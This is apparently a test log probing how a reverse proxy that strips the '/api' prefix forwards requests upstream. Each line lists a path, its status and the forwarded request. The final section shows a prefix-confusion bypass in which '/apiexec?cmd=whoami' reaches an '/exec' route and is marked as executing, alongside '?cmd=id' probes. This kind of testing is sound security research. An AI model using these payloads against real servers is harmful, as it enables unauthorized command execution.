CONTROL /hello.txt | 200 | - | b'ALPHA\n'   <-- must be 200
/api | 200 | 3 | 'GET / HTTP/1.1'
/api/ | 200 | 3 | 'GET // HTTP/1.1'
/api/x | 200 | 3 | 'GET //x HTTP/1.1'
/api//x | 200 | 3 | 'GET ///x HTTP/1.1'
/app | 404 | 0 | <no upstream>
/ap | 404 | 0 | <no upstream>
/ | 200 | 0 | <no upstream>
/api/x/y | 200 | 3 | 'GET //x/y HTTP/1.1'

## prefix-unmatched (decoded shorter than prefix) -> location not selected
/a | 404 | no upstream
/ap | 404 | no upstream
/ap?cmd=id | 404 | no upstream

## zero-percent payload + %2f off-by-N (prefix /api, upstream route /exec)
N=0 /apiexec?cmd=whoami | 200 | 3 | 'GET /exec?cmd=whoami HTTP/1.1' | EXEC
N=1 /api%2fexec?cmd=whoami | 200 | 3 | 'GET //exec?cmd=whoami HTTP/1.1' | no-exec
N=2 /api%2f%2fexec?cmd=whoami | 200 | 3 | 'GET ///exec?cmd=whoami HTTP/1.1' | no-exec
N=3 /api%2f%2f%2fexec?cmd=whoami | 200 | 3 | 'GET ////exec?cmd=whoami HTTP/1.1' | no-exec
